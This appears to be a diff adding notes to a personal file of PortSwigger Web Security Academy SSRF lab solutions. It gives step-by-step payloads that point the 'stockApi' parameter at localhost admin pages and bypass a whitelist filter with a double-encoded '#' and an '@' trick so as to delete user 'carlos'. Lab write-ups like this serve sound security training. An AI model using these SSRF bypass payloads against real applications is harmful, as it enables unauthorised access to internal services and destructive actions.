@@ -20,3 +20,10 @@ solution:
     step-1: using burpsuite, send proxy intercept (after clicking 'check stock') to intruder, and change value of 'stockApi' parameter to stockApi=http://LOCALHOST/ADMIN
     step-2: grab url of link to delete user 'carlos' and append it to the value parameter used in step 1, (stockApi=http://LOCALHOST/ADMIN/DELETE?username=carlos)
 
+[lab: SSRF with whitelist-based input filter]
+url: https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter
+solution: (note: I had to look at 3 of the hints to solve this lab. I was able to figure it out after reading the hint to double encode the '#'. It turns out there are 
+          multiple solutions, as my solution is not the same as the one in the help, which is 'http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos')
+    step-1: stockApi=http://127.0.0.1%2523@stock.weliketoshop.net%3A8080
+    step-2: stockApi=http://127.0.0.1%2523@stock.weliketoshop.net%3A8080/admin/delete?username=carlos
+
